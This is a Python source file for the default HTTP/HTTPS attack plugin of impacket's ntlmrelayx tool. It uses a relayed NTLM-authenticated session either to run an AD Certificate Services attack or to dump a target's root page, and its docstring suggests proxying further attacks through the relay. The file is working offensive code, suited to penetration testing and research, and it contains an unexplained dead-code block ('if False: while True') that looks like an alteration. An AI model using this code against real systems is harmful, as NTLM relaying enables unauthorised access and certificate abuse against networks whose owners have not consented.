from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack
PROTOCOL_ATTACK_CLASS = 'HTTPAttack'

class HTTPAttack(ProtocolAttack, ADCSAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ['HTTP', 'HTTPS']

    def run(self):
        if False:
            while True:
                i = 10
        if self.config.isADCSAttack:
            ADCSAttack._run(self)
        else:
            self.client.request('GET', '/')
            r1 = self.client.getresponse()
            print(r1.status, r1.reason)
            data1 = r1.read()
            print(data1)